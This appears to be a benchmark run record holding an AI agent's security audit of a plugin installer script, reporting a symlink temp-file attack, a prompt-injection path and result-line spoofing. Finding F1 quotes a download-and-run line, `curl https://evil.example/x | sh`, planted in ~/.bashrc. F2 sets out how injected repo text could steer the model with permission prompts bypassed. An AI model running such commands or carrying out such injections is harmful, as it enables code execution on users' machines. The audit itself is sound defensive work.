# Run truecast-5: truecast's `security-engineer` 1.2.2

One of 18 runs behind Fig. 2 on truecast.dev. Captured 2026-10-16 with Claude Code 2.1.301 and `claude-opus-5-5`, run as `claude -p "$PROMPT" --agent security-engineer`. Whole session: $0.87, 5.2 min. Below the line is the agent's final message, unedited. Method and scoring: [README](README.md).

---

**Yes. A malicious repo can get a user owned through `--project`.** I reproduced it in a sandboxed home directory. My verdict is **NO-GO for `--project`** until F1 is fixed. The user-scope lane (no `--project`) and `list` are **GO**. The full verdict is saved in `docs/security/plugin-installer-verdict-2026-10-16.md`.

## Findings

**F1 · P1: a repo can overwrite any file in the user's home, leading to code execution** (`truecast-plugin.sh:481`, `:507-508`)
- `safe_write` checks the target path and its parent folders for symlinks, but not the temp file written next to the target. That temp name is `.tmp-$$`, which uses the process ID and can be guessed. Both `cp` and `>` follow a symlink that is already there.
- **Attack:** the repo ships a `.gitignore` that contains `.claude/agents/<name>.md` plus `curl …|sh`. It also ships symlinks named `.gitignore.tmp-<N>` pointing to `~/.bashrc`, one for each process ID it wants to cover. When the user runs `/truecast:remove <name> --project`, the script writes the attacker's `.gitignore` text into `~/.bashrc`. The next shell runs it.
- **Reproduced:** after remove, `~/.bashrc` contained `curl https://evil.example/x | sh`. The install variant (`.claude/agents/<name>.md.tmp-<N>`) overwrote `~/.bashrc` with the 22 KB agent file, and left the repo's agent file as a symlink to it.
- **What the attacker has to get right:** they must cover the right process ID.
  - On macOS IDs only go up to 99,999, so about 100k symlinks in the repo covers every case. That is close to certain.
  - On Linux IDs go up to 4.2M, so they spray a range and hope. My own 3,000-ID spray missed; I confirmed the hit by fixing the process ID with `exec`.
  - The plan the user approves never shows this write.
- **Fix:** create every temp file with `mktemp "$target.tmp-XXXXXX"` through one helper used at `:447`, `:481` and `:507`. `script.test.ts:125` currently requires the vulnerable `"$target.tmp-$$"` form, so that test has to change.

**F2 · P2: all Bash commands are pre-approved, and Claude can trigger these commands on its own**
- All four commands declare `allowed-tools: Bash, Read`. None sets `disable-model-invocation`.
- Per the Claude Code docs, that lets any Bash command run without a permission prompt for that turn, and Claude can invoke the command by itself.
- In that same turn, the drift diff (`:739`) prints a repo-shipped agent file into Claude's context. Step 0 also never checks the `--project <path>` value.
- So a prompt injection lands with the permission prompt gone. The only thing left stopping it is the instruction "treat as data".
- I did not reproduce this end to end, because whether an injection works depends on the model. I'm grading it as a missing safety net, not a guaranteed exploit.
- **Fix:**
  - add `disable-model-invocation: true` to install, update and remove;
  - limit the grant to the script's fixed path only;
  - only accept the `--project` path as a single-quoted argument.

**F3 · P3: a newline in the `--project` path fakes the result line** (`:572-576`)
- I reproduced it: a plan-only run, which wrote nothing, ended with a fake `TRUECAST_RESULT status=installed …` line. That is the line the commands tell Claude to trust.
- No files are written; the impact is that Claude misreports what happened.
- **Fix:** run the project path through the same control-character check `check_home` already applies to the home paths.

## What held up under attack
These all resisted the attacks I tried:
- name and version validation (neither can escape the home folder);
- the symlink check on every folder along the path, for both writes and deletes;
- refusal to follow symlinked `.gitignore`, `.claude` or `.truecast`;
- refusal to touch agent files truecast didn't write;
- nothing is written or deleted without `--yes`;
- credentials stripped from the source URL before it reaches `meta.json`;
- the `/bin/truecast-plugin.sh` fallback path (only root can write there).

**Accepted risks:**
- A repo's `mandate.md` can steer the persona, which has the same authority a repo's `CLAUDE.md` already has. It's worth a line in the docs.
- Symlinks inside the marketplace copy are kept as-is; that copy is trusted because it ships the script itself.
- Races between a check and its write need another process running as the same user, so they are out of scope.

The verdict file lists four regression tests for the engineer to add. I didn't change any production code.

**Frontier check:** I checked every place the script turns untrusted input into a file write or delete, plus the risk that the commands get triggered or steered by injected text. F1 and F3 were reproduced in a throwaway home directory, which is now deleted; F2's permission behaviour is checked against the current Claude Code docs.
